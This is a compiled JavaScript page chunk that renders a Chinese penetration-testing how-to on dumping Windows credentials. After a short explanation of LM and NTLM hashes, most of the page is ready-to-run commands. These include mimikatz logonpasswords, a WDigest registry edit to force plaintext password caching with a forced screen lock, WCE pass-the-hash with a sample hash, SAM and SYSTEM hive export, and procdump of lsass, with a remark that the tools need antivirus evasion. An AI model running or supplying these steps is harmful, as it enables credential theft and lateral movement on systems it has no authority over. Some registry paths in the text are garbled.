(window.webpackJsonp=window.webpackJsonp||[]).push([[38],{764:function(s,a,t){"use strict";t.r(a);var e=t(103),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"本机密码和散列值获取"}},[s._v("本机密码和散列值获取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#本机密码和散列值获取"}},[s._v("#")])]),s._v(" "),t("h2",{attrs:{id:"lm-hash和ntml-hash"}},[s._v("LM Hash和NTML Hash "),t("a",{staticClass:"header-anchor",attrs:{href:"#lm-hash和ntml-hash"}},[s._v("#")])]),s._v(" "),t("p",[s._v("Windows操作系统中的密码由两部分加密组成，即"),t("code",[s._v("LM Hash")]),s._v("和"),t("code",[s._v("NTML Hash")]),s._v("。")]),s._v(" "),t("p",[s._v("LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用"),t("code",[s._v("0")]),s._v("补全。")]),s._v(" "),t("p",[s._v("自"),t("code",[s._v("Server 2003")]),s._v("之后，Windows的认证方式均为NTML Hash。")]),s._v(" "),t("p",[s._v("自"),t("code",[s._v("Server 2008")]),s._v("开始默认禁用"),t("code",[s._v("LM Hash")]),s._v("， 当密码超过14位时候会采用NTLM加密")]),s._v(" "),t("p",[s._v("如果抓取的"),t("code",[s._v("LM Hash")]),s._v("为 "),t("code",[s._v("AAD3B435B51404EEAAD3B435B51404EE")]),s._v("，说明密码为空或"),t("code",[s._v("LM Hash")]),s._v("被禁用。")]),s._v(" "),t("table",[t("thead",[t("tr",[t("th",{staticStyle:{"text-align":"left"}}),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("2003")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("win7")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("2008")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("2012")])])]),s._v(" "),t("tbody",[t("tr",[t("td",{staticStyle:{"text-align":"left"}},[s._v("LM")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}}),s._v(" "),t("td",{staticStyle:{"text-align":"left"}}),s._v(" "),t("td",{staticStyle:{"text-align":"left"}})]),s._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"left"}},[s._v("NTLM")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")])])])]),s._v(" "),t("p",[s._v("前面三个，当密码超过14位时候会采用NTLM加密。")]),s._v(" "),t("p",[t("strong",[s._v("Hash一般存储在两个地方")])]),s._v(" "),t("blockquote",[t("p",[t("strong",[s._v("SAM文件")]),s._v("：存储在本机，对应本地用户")]),s._v(" "),t("p",[t("strong",[s._v("NTDS.DIT文件")]),s._v("：存储在域控上，对应域用户")])]),s._v(" "),t("h2",{attrs:{id:"获取凭证的快捷路径"}},[s._v("获取凭证的快捷路径 "),t("a",{staticClass:"header-anchor",attrs:{href:"#获取凭证的快捷路径"}},[s._v("#")])]),s._v(" "),t("p",[s._v("翻数据库配置文件找数据库密码")]),s._v(" "),t("p",[s._v("翻用户桌面，可能存在服务器密码信息，甚至其它服务器")]),s._v(" "),t("p",[s._v("找内部wiki手册，邮箱等东西可能存在服务器IP和密码信息")]),s._v(" "),t("h2",{attrs:{id:"server-2012-抓明文密码"}},[s._v("Server 2012 抓明文密码 "),t("a",{staticClass:"header-anchor",attrs:{href:"#server-2012-抓明文密码"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("Server 08 及之前的版本可以直接抓明文密码")])]),s._v(" "),t("p",[s._v("将mimikatz上传到目标主机（需要免杀），并且要SYSTEM权限。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#读取散列值和明文密码")]),s._v("\nmimikatz.exe "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"privilege::debug"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"log"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"sekurlsa::logonpasswords"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#123")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("Server 2012 抓取明文密码：")])]),s._v(" "),t("blockquote",[t("p",[s._v("手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录+导出Hash+本地mimikatz抓明文")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#修改注册表来让Wdigest Auth保存明文口令")]),s._v("\nreg "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" /f\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#恢复")]),s._v("\nreg "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" /f\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("强制锁屏")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("rundll32.exe user32.dll,LockWorkStation\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"wce抓明文密码"}},[s._v("WCE抓明文密码 "),t("a",{staticClass:"header-anchor",attrs:{href:"#wce抓明文密码"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("WCE")]),s._v("会被杀软干掉")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#抓系统管理员明文密码")]),s._v("\nwce.exe -w\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#抓hash，列出登录的会话和NTLM凭据")]),s._v("\nwce.exe -l\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#重点，在无法破解目标hash明文的情况下可用hash注入")]),s._v("\nwce.exe -s 目标用户名:目标域名或IP:LM-HASH:NT-HASHwce.exe -s Administrator:192.168.2.130:F0D412BD764FFE81AAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("blockquote",[t("p",[s._v("hash注入的原理是，将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程"),t("code",[s._v("lsass.exe")]),s._v("中去")]),s._v(" "),t("p",[s._v("使得本地在使用"),t("code",[s._v("ipc")]),s._v("登录目标机器的时候就如同自己登录自己的机器一样获得权限")]),s._v(" "),t("p",[s._v("需要支持受限管理员模式，Server 2012-r2后默认支持受限管理员模式")])]),s._v(" "),t("h2",{attrs:{id:"sharpdump-mimikatz本地读取"}},[s._v("Sharpdump+ mimikatz本地读取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#sharpdump-mimikatz本地读取"}},[s._v("#")])]),s._v(" "),t("p",[s._v("需要.NET 3.5版本框架")]),s._v(" "),t("p",[s._v("下载地址：https://github.com/GhostPack/SharpDump")]),s._v(" "),t("p",[s._v("Dump 的文件默认是 bin 后缀，拖到本地机器把 bin 重命名为 zip，然后解压徂徕再丢给 mimikatz")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("mimikatz.exe “sekurlsa::minidump debug45” “sekurlsa::logonPasswords full” “exit”\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"注册表-mimikatz本地读取"}},[s._v("注册表 + mimikatz本地读取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#注册表-mimikatz本地读取"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("（1）导出SAM和System文件")])]),s._v(" "),t("p",[s._v("Win2000和XP需要先提到"),t("code",[s._v("SYSTEM")]),s._v("，03开始直接可以reg save")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("reg save hklm"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("sam sam.hive\nreg save hklm"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system system.hive\nreg save hklm"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("security security.hive\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[t("strong",[s._v("（2）mimikatz本地读取 NTML Hash")])]),s._v(" "),t("blockquote",[t("p",[s._v("mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；")]),s._v(" "),t("p",[s._v("还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将导出的文件和mimikatz放到同一目录")]),s._v("\nmimikatz.exe lsadump::sam /sam:sam.hive /system:system.hive /security:security.hive\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h2",{attrs:{id:"procdump-mimikatz本地读取"}},[s._v("Procdump + mimikatz本地读取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#procdump-mimikatz本地读取"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("（1） Procdump dump lsass（管理员权限下运行 ）")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#32位系统")]),s._v("\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#64位系统")]),s._v("\nprocdump.exe -accepteula -64 -ma lsass.exe lsass.dmp\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[t("strong",[s._v("（2）mimikatz本地读取hash")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#放到同一目录")]),s._v("\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonPasswords full\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])])])}),[],!1,null,null,null);a.default=n.exports}}]);